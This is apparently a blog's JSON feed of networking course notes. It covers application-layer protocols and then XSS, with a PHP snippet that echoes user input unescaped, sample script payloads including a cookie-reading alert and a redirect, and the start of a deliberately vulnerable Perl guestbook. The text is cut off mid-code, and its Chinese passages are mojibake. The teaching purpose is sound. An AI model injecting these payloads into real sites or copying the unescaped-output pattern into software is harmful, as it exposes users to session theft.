{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"http\" tag",
    "description": "ğŸŒ¸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/course/Layer-7-Application-layer-Protocols-and-Services/",
            "url": "http://example.com/course/Layer-7-Application-layer-Protocols-and-Services/",
            "title": "(Layer 7) Application-layer Protocols and Services",
            "date_published": "2024-11-04T03:27:37.000Z",
            "content_html": "<h1 id=\"Hypertext Transfer Protocol (HTTP)\" class=\"active\"><a class=\"anchor\"  href=\"#Hypertext Transfer Protocol (HTTP)\">#</a>Hypertext Transfer Protocol (HTTP)</h1>\n\n<ol>\n<li>World Wide Web (WWW)</li>\n</ol>\n<ul>\n<li>The most popular service on the Internet</li>\n<li>Immense collection of Web pages and other resources that can be downloaded across the Internet and displayed on a workstation via a web browser</li>\n<li>The main concept is <code>hypertext</code></li>\n<li>A system that allows related documents to be linked together<ul>\n<li>A â€œwebâ€ of electronically-linked documents</li>\n</ul>\n</li>\n<li>Major functional components of the WWW<ul>\n<li>HyperText Markup Language (HTML)</li>\n<li>Hypertext Transfer Protocol (HTTP)</li>\n<li>Uniform Resource Identifiers (URIs)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>HTTP<br>Originally, its main purpose was to transfer static web pages written in HTML</li>\n</ol>\n<ul>\n<li>Now, it is also used for general file transfer and downloading&#x2F;displaying multimedia files</li>\n<li>Default TCP port number is 80</li>\n<li>HTTP is an application-layer protocol<ul>\n<li>HTTP&#x2F;2 is based on TCP as its Transport-layer protocol</li>\n<li>HTTP&#x2F;3 is based on QUIC as its Transport-layer protocol (RFC 9114, released on 6 June 2022)<ul>\n<li>QUIC (RFC 9000, released in May 2021)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Functions as a request-response protocol in the client-server computing model</li>\n<li>Identify and locate network resources by Uniform Resource Identifiers (URIs)</li>\n</ul>\n<ol start=\"3\">\n<li>HTTP Encapsulation</li>\n</ol>\n<ul>\n<li>Example of how the layers work together:<ol>\n<li><p>start your Web browser and your home page is <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS8=\">http://www.example.com</span></p>\n</li>\n<li><p>The web browser formats a request for your home page by using the Application layer protocol HTTP</p>\n</li>\n<li><p>The request looks something like: <code>get the example.com home page</code></p>\n</li>\n<li><p>The unit of information the Application layer works with is simply called <code>data</code><br>The Application-layer protocol HTTP passes the request down to the Transport-layer protocol (TCP)</p>\n</li>\n<li><p>TCP adds a header to the request</p>\n</li>\n<li><p>The unit of information the Transport layer works with is called a <code>segment</code></p>\n</li>\n<li><p>TCP passes the segment to the Internetwork layer protocol (IP)</p>\n</li>\n<li><p>IP places its header on the segment</p>\n</li>\n<li><p>The unit of information is now called a <code>packet</code></p>\n</li>\n<li><p>The packet is passed down to the Network access layer, where the NIC operates</p>\n</li>\n<li><p>A <code>frame</code> header and trailer are added<br><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/6b810b6747c82aec.png\" alt=\"img\"></p>\n</li>\n<li><p>The frame is delivered to the network medium as bits</p>\n</li>\n</ol>\n<ul>\n<li>on its way to the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS8=\">www.example.com</span> server</li>\n</ul>\n<ol start=\"13\">\n<li>The web server processes it and returns a Web page</li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Uniform Resource Identifiers (URIs)</li>\n</ol>\n<ul>\n<li>A method of defining labels that the users of the Web could locate hypertext documents so they could be located and referenced</li>\n<li>Not specific to the Web, though they are most often associated with the Web and HTTP</li>\n<li>Uniform Resource Locators (URLs) are a subset of URIs</li>\n</ul>\n<ol start=\"5\">\n<li>Locating a Document on the Internet</li>\n</ol>\n<ul>\n<li>Every document on the Internet has a unique Uniform Resource Locator (URL)</li>\n<li>All URLs consist of four parts:<ul>\n<li>Service type, e.g., http:&#x2F;&#x2F;</li>\n<li>Host or domain name, e.g., example.com</li>\n<li>Directory or subdirectory information</li>\n<li>Filename</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Web Client&#x2F;Server</li>\n</ol>\n<ul>\n<li>Web client<ul>\n<li>To communicate with a web server, using Hypertext Transfer Protocol (HTTP)<ul>\n<li>Firefox, Edge, Chrome</li>\n</ul>\n</li>\n<li>To submit an HTTP request to the server</li>\n</ul>\n</li>\n<li>Web server<ul>\n<li>To provide web content that can be accessed through the Internet<ul>\n<li>Microsoftâ€™s Internet Information Services (IIS)</li>\n<li>Apache</li>\n</ul>\n</li>\n<li>To provide response message to the client</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Domain Name System (DNS)\" class=\"active\"><a class=\"anchor\"  href=\"#Domain Name System (DNS)\">#</a>Domain Name System (DNS)</h1>\n\n<h2 id=\"DNS\" class=\"active\"><a class=\"anchor\"  href=\"#DNS\">#</a>DNS</h2>\n\n<ol>\n<li>Domain Names</li>\n</ol>\n<ul>\n<li>Domain<ul>\n<li>Group of computers belonging to same organization</li>\n<li>Share common part of IP address</li>\n</ul>\n</li>\n<li>Domain name<ul>\n<li>Identifies domain (loc.gov)</li>\n<li>Associated with company, university, government organization</li>\n</ul>\n</li>\n<li>Fully qualified host name (blogs.loc.gov)<ul>\n<li>Local host name plus domain name</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Domain Name System (DNS)</li>\n</ol>\n<ul>\n<li>Commonly used analogy a â€œphone bookâ€ for the Internet</li>\n<li>To keep the system manageable, the DNS is a hierarchical distributed naming service for computers&#x2F;services&#x2F;resources connected to the Internet</li>\n<li>Translate human-friendly computer hostnames into IP addresses to locate computer resources<ul>\n<li>Computers do not use domain names, but binary addressing</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"DNS Database Structure\" class=\"active\"><a class=\"anchor\"  href=\"#DNS Database Structure\">#</a>DNS Database Structure</h2>\n\n<ol>\n<li>DNS Database Structure</li>\n</ol>\n<ul>\n<li>Can be best understood as a tree structure<ul>\n<li>In the domain namespace, all domains meet at the root, identified by a single period (.)</li>\n</ul>\n</li>\n<li>Second-level domain (SLD) are usually the name of a company or institution</li>\n<li>Subdomain is optional</li>\n<li>Host level represents individual device</li>\n<li>Some Well-known Top-level Domains<table>\n<thead>\n<tr>\n<th>Domain suffix</th>\n<th>Type of organization</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ARPA</td>\n<td>Reverse lookup domain (special Internet function)</td>\n</tr>\n<tr>\n<td>COM</td>\n<td>Commercial</td>\n</tr>\n<tr>\n<td>EDU</td>\n<td>Educational</td>\n</tr>\n<tr>\n<td>GOV</td>\n<td>Government</td>\n</tr>\n<tr>\n<td>ORG</td>\n<td>Noncommercial organization (such as a nonprofit agency)</td>\n</tr>\n<tr>\n<td>NET</td>\n<td>Network (such as an ISP)</td>\n</tr>\n<tr>\n<td>INT</td>\n<td>International Treaty Organization</td>\n</tr>\n<tr>\n<td>MIL</td>\n<td>United States military organization</td>\n</tr>\n<tr>\n<td>BIZ</td>\n<td>Businesses</td>\n</tr>\n<tr>\n<td>INFO</td>\n<td>Unrestricted use</td>\n</tr>\n<tr>\n<td>AERO</td>\n<td>Air-transport industry</td>\n</tr>\n<tr>\n<td>COOP</td>\n<td>Cooperatives</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Root Servers</li>\n</ol>\n<ul>\n<li>Root servers are the authoritative name servers that serve the DNS root zone</li>\n<li>Root servers are a network of hundreds of servers for redundancy in many countries around the world.</li>\n<li>They are specified in the DNS root zone as 13 logical named authorities.<ul>\n<li>This does not mean that there are only 13 physical servers; each operator uses redundant computer equipment to provide reliable<br>service</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>DNS Client (Resolver)</li>\n</ol>\n<ul>\n<li>DNS clients in most operating systems maintain a DNS cache, called a resolver cache<ul>\n<li>Stores name and IP address pairs and other data</li>\n</ul>\n</li>\n<li>The DNS client is responsible for communicating with a DNS server to resolve computer and domain names to IP addresses</li>\n<li>An OS must be configured to use DNS and needs at least one address of a DNS server that it can query</li>\n<li>In Windows, the first DNS server configured is called the preferred DNS server and the second one is the alternate DNS server</li>\n</ul>\n<ol start=\"4\">\n<li>DNS server<br>DNS servers are composed of the following:</li>\n</ol>\n<ul>\n<li>DNS zones â€“ a database of primarily hostname and IP address pairs</li>\n<li>Resource records â€“ the data contained in a zone</li>\n<li>Cache â€“ results of queries are cached so that if the same query occurs again, the local DNS server can respond without having to contact another server</li>\n<li>Root hints â€“ file containing a list of all IP addresses of Internet root servers</li>\n<li>DNS Server service â€“ runs in the background and listens for DNS queries on UDP port 53</li>\n<li>DNS Query Making its Way Through the DNS Hierarchy<br><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/95ccdad58249c863.png\" alt=\"img\"></li>\n</ul>\n<h2 id=\"DNS Database Records\" class=\"active\"><a class=\"anchor\"  href=\"#DNS Database Records\">#</a>DNS Database Records</h2>\n\n<ol>\n<li>Resource records (RR)</li>\n</ol>\n<ul>\n<li>Stores data associated with domain names, address records, and other specific data</li>\n<li>Divided into four classes, of which Internet class is of most interest to the users</li>\n</ul>\n<ol start=\"2\">\n<li>Most Commonly Used Record Types<ol>\n<li>Start of Authority (SOA) record</li>\n</ol>\n<ul>\n<li>Identifies the name server that is authoritative for a specific DNS database segment;</li>\n<li>Identifies the master DNS server for a specific domain or sub-domain</li>\n<li>First entry in the DNS file - both <code>domain.dns</code> and <code>addr.in-addr.arpa.dns</code> files - must be an SOA record</li>\n<li>Identifies the current name server as the best source of information for data in its zone</li>\n<li>Both secondary and primary name servers can<ul>\n<li>Designate themselves as authoritative in their own SOA records</li>\n<li>This allows load-balancing across a primary and one or more secondary DNS servers in a domain</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Name Server (NS) record</li>\n</ol>\n<ul>\n<li>Used to identify all DNS servers in a domain</li>\n</ul>\n<ol start=\"3\">\n<li>Address (A) record</li>\n</ol>\n<ul>\n<li>Stores domain name-to-IP address translation data</li>\n</ul>\n<ol start=\"4\">\n<li>Canonical name (CNAME) record</li>\n</ol>\n<ul>\n<li>Used to create aliases</li>\n</ul>\n<ol start=\"5\">\n<li>Mail Exchange (MX) record</li>\n</ol>\n<ul>\n<li>Used to route SMTP-based e-mail on the Internet and identify the IP address for a domainâ€™s master e-mail server</li>\n</ul>\n<ol start=\"6\">\n<li>Pointer (PTR) record</li>\n</ol>\n<ul>\n<li>Stores IP address-to-domain name translation data and supports the operation known as a reverse DNS lookup</li>\n</ul>\n</li>\n<li>Mapping Addresses to Names</li>\n</ol>\n<ul>\n<li>Records in the <code>db.addr</code> file are provided to support reverse DNS lookups</li>\n<li>Reverse address lookups are used primarily to determine if IP address that a user presents matches the domain name from which the user claims to originate</li>\n</ul>\n<ol start=\"4\">\n<li>Resolving process<ol>\n<li>The DNS query is sent by the resolver to the local DNS server for resolution</li>\n<li>If local DNS server does not recognise the address, then it queries the root server</li>\n<li>If root server doesnâ€™t recognize the domain name, the root will provide relevant information to the the resolver to contact the name server, which is the next level down</li>\n<li>Repetition of the step to process each domain name in a top-down manner until the query is resolved, then<ul>\n<li>The resolver returns the resolved IP address to the requester</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"Remote Login (Telnet) and Secure Shell (SSH)\" class=\"active\"><a class=\"anchor\"  href=\"#Remote Login (Telnet) and Secure Shell (SSH)\">#</a>Remote Login (Telnet) and Secure Shell (SSH)</h1>\n\n<ol>\n<li>Remote Login (Telnet and SSH)</li>\n</ol>\n<ul>\n<li>A terminal emulation program for TCP&#x2F;IP networks<ul>\n<li>Allows a user to remotely log in to a distant computer site</li>\n<li>User usually needs a login ID and password to access a remote computer site</li>\n<li>To provide access to a command-line interface on a remote host</li>\n</ul>\n</li>\n<li>Telnet and SSH: network protocols for remote login<ul>\n<li>Telnet (Port 23) is not secure</li>\n<li>SSH (Port 22) provides an encrypted channel between the client and server</li>\n</ul>\n</li>\n<li>SSH Clients<ul>\n<li>PuTTY</li>\n<li>use SSH from Windows Command window and MacOS terminal window</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Remote Desktop Software</li>\n</ol>\n<ul>\n<li>Remote desktop software<ul>\n<li>Remote Desktop Protocol (RDP)<ul>\n<li>Uses Graphic User Interface (GUI) to manage&#x2F;access Windows computers remotely</li>\n</ul>\n</li>\n<li>Independent Computing Architecture (ICA)</li>\n<li>Virtual network computing (VNC)</li>\n</ul>\n</li>\n<li>Some remote desktop clients<ul>\n<li>Googleâ€™s Chrome Remote Desktop</li>\n<li>Microsoft Remote Desktop</li>\n<li>TeamViewer</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Simple Mail Transfer Protocol (SMTP)\" class=\"active\"><a class=\"anchor\"  href=\"#Simple Mail Transfer Protocol (SMTP)\">#</a>Simple Mail Transfer Protocol (SMTP)</h1>\n\n<h2 id=\"E-mail Protocol\" class=\"active\"><a class=\"anchor\"  href=\"#E-mail Protocol\">#</a>E-mail Protocol</h2>\n\n<ol>\n<li>E-mail Protocols</li>\n</ol>\n<ul>\n<li>Post Office Protocol version 3 (POP3) is used to download incoming messages from e-mail servers to local desktops (uses TCP port 110)</li>\n<li>Internet Message Access Protocol v.4 (IMAP4) used to manage email messages locally and yet stores email folders on a server (uses TCP port 143)</li>\n<li>Simple Mail Transfer Protocol (SMTP) is the standard protocol for sending email over the Internet (uses TCP port 25)</li>\n</ul>\n<ol start=\"2\">\n<li>é‚®ä»¶ç³»ç»Ÿçš„ç»„æˆ<ol>\n<li>Mail User Agent (MUA) - é‚®ä»¶ç”¨æˆ·ä»£ç†</li>\n</ol>\n<ul>\n<li>åŠŸèƒ½ï¼šMUAæ˜¯ç”µå­é‚®ä»¶åº”ç”¨ç¨‹åºï¼Œç”¨äºåˆ›å»ºã€å‘é€ã€æ¥æ”¶ã€å­˜å‚¨ã€å›å¤å’Œè½¬å‘ç”µå­é‚®ä»¶ã€‚å®ƒè¿˜æ”¯æŒé™„ä»¶åŠŸèƒ½ã€‚</li>\n<li>ç¤ºä¾‹ï¼šå¦‚Outlookã€Thunderbirdç­‰ã€‚</li>\n<li>ç”¨é€”ï¼šé€šè¿‡SMTPåè®®å‘é€é‚®ä»¶ï¼Œé€šè¿‡POPæˆ–IMAPåè®®ä¸‹è½½å’Œæ¥æ”¶é‚®ä»¶ã€‚</li>\n</ul>\n<ol start=\"2\">\n<li>Message Transfer Agent (MTA) - æ¶ˆæ¯ä¼ è¾“ä»£ç†</li>\n</ol>\n<ul>\n<li>åŠŸèƒ½ï¼šMTAè´Ÿè´£å‡†å¤‡å’Œä¼ è¾“ç”µå­é‚®ä»¶æ¶ˆæ¯ï¼Œç¡®ä¿é‚®ä»¶èƒ½å¤Ÿåœ¨ä¸åŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“ã€‚</li>\n<li>ç”¨é€”ï¼šMTAåœ¨ä¸åŒçš„é‚®ä»¶æœåŠ¡å™¨ä¹‹é—´ä¼ é€’é‚®ä»¶ã€‚</li>\n</ul>\n<ol start=\"3\">\n<li>Multipurpose Internet Mail Extension (MIME) - å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•</li>\n</ol>\n<ul>\n<li>åŠŸèƒ½ï¼šMIMEç”¨äºå°†éæ–‡æœ¬æ ¼å¼çš„æ–‡ä»¶ï¼ˆå¦‚å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼‰é™„åŠ åˆ°ç”µå­é‚®ä»¶ä¸­ï¼Œä½¿å¾—ç”µå­é‚®ä»¶å¯ä»¥åŒ…å«å¤šç§æ ¼å¼çš„å†…å®¹ã€‚</li>\n<li>ç”¨é€”ï¼šé€šè¿‡MIMEæ ‡å‡†ï¼Œç”µå­é‚®ä»¶ä¸ä»…èƒ½ä¼ è¾“æ–‡æœ¬ï¼Œè¿˜èƒ½ä¼ è¾“é™„ä»¶ï¼Œå¦‚å›¾ç‰‡ã€PDFç­‰æ–‡ä»¶ã€‚</li>\n</ul>\n</li>\n<li>é‚®ä»¶ç³»ç»Ÿçš„å·¥ä½œæµç¨‹<ul>\n<li>å‘é€é‚®ä»¶ï¼šMUAåˆ›å»ºé‚®ä»¶å¹¶é€šè¿‡SMTPåè®®å°†å…¶å‘é€åˆ°MTAï¼›MTAå°†é‚®ä»¶ä¼ é€’åˆ°æ”¶ä»¶äººçš„SMTPæœåŠ¡å™¨ã€‚</li>\n<li>æ¥æ”¶é‚®ä»¶ï¼šæ”¶ä»¶äººçš„MUAé€šè¿‡POPæˆ–IMAPåè®®ä»SMTPæœåŠ¡å™¨ä¸‹è½½é‚®ä»¶<br><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/b496d50c4b936cc4.png\" alt=\"email\"></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"SMTP\" class=\"active\"><a class=\"anchor\"  href=\"#SMTP\">#</a>SMTP</h2>\n\n<ol>\n<li>SMTP Communications</li>\n</ol>\n<ul>\n<li>SMTP commands and reply codes immediately follow the TCP header</li>\n<li>SMTP commands occur behind the scenes in some e-mail clients and some server-to-server mail transfers on the Internet</li>\n<li>The majority of e-mail clients today use SMTP to send outgoing mail through some nearby SMTP server which assumes the task of storing or forwarding such messages, depending on addresseeâ€™s domain<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>helo</td>\n<td>Used by the client to identify itself</td>\n</tr>\n<tr>\n<td>mail from</td>\n<td>Used by the client to identify the sender</td>\n</tr>\n<tr>\n<td>rcpt to</td>\n<td>Used by the client to identify the recipient</td>\n</tr>\n<tr>\n<td>data</td>\n<td>Used to send the message</td>\n</tr>\n<tr>\n<td>quit</td>\n<td>To terminate the message</td>\n</tr>\n<tr>\n<td>vrfy</td>\n<td>Used to verify the address of recipient</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/e4681fbfda7303a9.png\" alt=\"email\"></p>\n<h1 id=\"File Transfer Protocol (FTP)\" class=\"active\"><a class=\"anchor\"  href=\"#File Transfer Protocol (FTP)\">#</a>File Transfer Protocol (FTP)</h1>\n\n<ol>\n<li>FTP</li>\n</ol>\n<ul>\n<li>FTP is a client&#x2F;server protocol used for file transfer across the Internet<ul>\n<li>Uses two channels: TCP ports 20 and 21<ul>\n<li>Port 21 for control commands, Port 20 for transferring data</li>\n</ul>\n</li>\n<li>Not a secure protocol</li>\n</ul>\n</li>\n<li>Uses URL for an FTP site begins with <code>ftp://...</code></li>\n<li>The 3 most common ways to access an FTP site:<ul>\n<li>Through a browser</li>\n<li>Using an FTP client program</li>\n<li>Issuing FTP commands at a text-based command prompt</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>FTP connections</li>\n</ol>\n<ul>\n<li>TCP-based Command Connection (control connection)<ul>\n<li>The command connection runs over TCP</li>\n<li>Created automatically when FTP connection is established in response to open command from FTP client, using server FTP port number 21</li>\n<li>The client uses a dynamic, or ephemeral, port number to handle the other end of a command connection</li>\n</ul>\n</li>\n<li>TCP-based Data Transfer Connection (data connection)<ul>\n<li>The data transfer connection also runs over TCP</li>\n<li>Created by the server by default</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Dynamic Host Configuration Protocol (DHCP)\" class=\"active\"><a class=\"anchor\"  href=\"Dynamic Host Configuration Protocol (DHCP)\">#</a>Dynamic Host Configuration Protocol (DHCP)</h1>\n\n<ol>\n<li>DHCP</li>\n</ol>\n<ul>\n<li>DHCP is used to automatically assign IP addresses as needed<ul>\n<li>When a computer is turned on, it requests an address from a server that is configured as a DHCP server</li>\n<li>The server assigns an address for a specific amount of time (called<br>a lease)</li>\n</ul>\n</li>\n<li>DHCP Server service â€“ runs in the background and listens on UDP port 67 for IP address requests</li>\n</ul>\n<ol start=\"2\">\n<li>DHCP Server</li>\n</ol>\n<ul>\n<li>A DHCP server is composed of the following:<ul>\n<li>IP address scope â€“ a range of IP addresses the server leases to clients<ul>\n<li>Scope options â€“ IP settings: default gateway, DNS servers, and other options</li>\n<li>Reservations â€“ an IP address tied to a particular MAC address</li>\n<li>Exclusions â€“ one or more IP addresses excluded from the IP address scope</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>After an address is leased<ul>\n<li>A record of the lease is stored in a database, including a lease expiration time</li>\n<li>When 50% of the lease time has elapsed, the computer attempts to renew the lease from the same DHCP server that originally responded</li>\n<li>If no response, the computer waits until lease is 87.5% expired, a broadcast DHCP renewal request is sent<ul>\n<li>If no response when lease expires, computer broadcasts a DCHP request for a new IP address</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Benefit of using DHCP<ul>\n<li>Computers can easily be moved and requested new IP configuration from a DHCP server on the new segment</li>\n</ul>\n</li>\n<li>DHCP uses UDP<ul>\n<li>DHCP servers are usually located on the same network and DHCP messages are short</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li><p>DHCP Process<br>Broadcast packets used by the DHCP process:</p>\n<ol>\n<li>DHCPDISCOVER â€“ the client announces to the network that itâ€™s looking for a DHCP server</li>\n<li>DHCPOFFER â€“ the server replies and offers the client an IP address for lease</li>\n<li>DHCPREQUEST â€“ the client wants the offered IP address</li>\n<li>DHCPACK â€“ the server acknowledges the transaction and the client can now use the IP address</li>\n</ol>\n</li>\n</ol>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/065a09e3ea0c2cfe.png\" alt=\"DHCP\"></p>\n",
            "tags": [
                "network system",
                "HTTP",
                "DHCP",
                "DNS",
                "SSH",
                "FTP",
                "SMTP"
            ]
        },
        {
            "id": "http://example.com/course/Cross-Site-attack/",
            "url": "http://example.com/course/Cross-Site-attack/",
            "title": "Cross-Site attack",
            "date_published": "2024-10-30T12:31:43.000Z",
            "content_html": "<h1 id=\"Cross-Site Scripting\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Scripting\">#</a>Cross-Site Scripting</h1>\n\n<h2 id=\"XSS\" class=\"active\"><a class=\"anchor\"  href=\"#XSS\">#</a>XSS</h2>\n\n<ol>\n<li>Cross-Site Scripting (XSS)</li>\n</ol>\n<ul>\n<li>Causes arbitrary code to run in a browser that is connected to a trusted Web site <ul>\n<li>May occur when code returns HTML output that makes use of user inputs  </li>\n<li>Trick users into clicking a hyperlink from outside the site</li>\n</ul>\n</li>\n<li>Attacks allows: <ul>\n<li>Disclosure of user files </li>\n<li>Installation of Trojans </li>\n<li>Redirection to other pages </li>\n<li>Trivial theft of cookies</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li><p>Basic Problem: Echoing Untrusted User Input<br>Classic mistake in a server-side application with URL <code>http://naive.com/search.php?term=justin+bieber</code><br>PHP at search.php responds with</p>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;&lt;title&gt;Search results&lt;/title&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">   You have searched for </span><br><span class=\"line\">   &lt;?php echo $_GET[&#x27;term&#x27;] ?&gt; </span><br><span class=\"line\">   ...  </span><br><span class=\"line\"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>åœ¨è¿™é‡Œï¼Œ<code>$_GET[&#39;term&#39;]</code> çš„å†…å®¹ç›´æ¥è¢«åµŒå…¥åˆ° HTML ä¸­è¿›è¡Œå›æ˜¾ã€‚å¦‚æœ <code>$_GET[&#39;term&#39;]</code> åŒ…å«æ¶æ„çš„ HTML æˆ– JavaScript ä»£ç ï¼Œåˆ™å¯èƒ½å¼•å‘è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ã€‚</p>\n</li>\n<li><p>Dangerous HTML Inputs</p>\n</li>\n</ol>\n<ul>\n<li><code>&lt;script&gt;alert(&quot;Boo!&quot;)&lt;/script&gt;</code><br>æ­¤ä»£ç å¼¹å‡ºä¸€ä¸ªè­¦å‘Šå¯¹è¯æ¡†ï¼Œè¯æ˜ XSS æ”»å‡»æ˜¯å¯èƒ½çš„ã€‚</li>\n<li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>æ­¤ä»£ç ä¼šæ‰“å°å½“å‰é¡µé¢çš„ Cookie ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šçªƒå–ç”¨æˆ·çš„ä¼šè¯ Cookieï¼Œä»è€ŒåŠ«æŒä¼šè¯ã€‚</li>\n<li><code>&lt;script&gt;document.write(&quot;&lt;br&gt;&quot;)&lt;/script&gt;</code><br>æ­¤ä»£ç ä¼šåœ¨é¡µé¢ä¸­æ·»åŠ ä¸€ä¸ª <code>&lt;br&gt;</code> æ ‡ç­¾ï¼Œæ˜¾ç¤ºæ”»å‡»è€…å¯ä»¥æ›´æ”¹ç½‘é¡µå†…å®¹ã€‚</li>\n<li><code>&lt;script&gt;window.location=&#39;http://google.com&#39;&lt;/script&gt;</code><br>æ­¤ä»£ç ä¼šå°†å½“å‰ç½‘é¡µé‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å°†ç”¨æˆ·å¯¼å‘æ¶æ„ç«™ç‚¹</li>\n</ul>\n<ol start=\"4\">\n<li>Main Types of Cross-Site Scripting Attacks<ol>\n<li>Stored (persistent)</li>\n<li>Reflected (non-persistent)</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Stored (Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Stored (Persistent) XSS Attacks\">#</a>Stored (Persistent) XSS Attacks</h2>\n\n<ol>\n<li>Data supplied by an attacker is <strong>permanently stored</strong> on a server and displayed to other users when browsing without being properly sanitised<br>If the user input is displayed in the page <ul>\n<li>HTML tags can mess up the look of the page </li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour </li>\n<li>For the current user or other users<br><img data-src=\"https://img.picui.cn/free/2024/10/30/67222f628055d.png\" alt=\"img\"><figure class=\"highlight perl\"><figcaption><span>Example Vulnerable Guestbook Program</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!perl</span></span><br><span class=\"line\"> <span class=\"comment\"># Fig. 19.6: fig19_06.pl</span></span><br><span class=\"line\"> <span class=\"comment\"># Guestbook program.</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">use</span> warnings;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> strict;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> CGI <span class=\"string\">qw( :standard )</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( header(), start_html( <span class=\"string\">&quot;Guestbook&quot;</span> ), h1( <span class=\"string\">&quot;Guestbook&quot;</span> ));</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( param() ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> h3( <span class=\"string\">&quot;Thank you for signing our guestbook!!!&quot;</span> ),</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$name</span> = param( <span class=\"string\">&quot;name&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$email</span> = param( <span class=\"string\">&quot;email&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$message</span> = param( <span class=\"string\">&quot;message&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;&gt;&gt;guestbook.log&quot;</span> ) <span class=\"keyword\">or</span>   //Open the guestbook file</span><br><span class=\"line\">       <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">print</span>( FILE, <span class=\"string\">&quot;\\n&quot;</span>, hr(), <span class=\"string\">&quot;From: &quot;</span>, </span><br><span class=\"line\">       a( &#123; <span class=\"string\">-href =&gt;</span> <span class=\"string\">&quot;mailto:<span class=\"variable\">$email</span>&quot;</span> &#125;, <span class=\"variable\">$name</span> ), br(), br(),</span><br><span class=\"line\">       <span class=\"variable\">$message</span> );    <span class=\"regexp\">//</span> Store the user entered data in the guestbook file</span><br><span 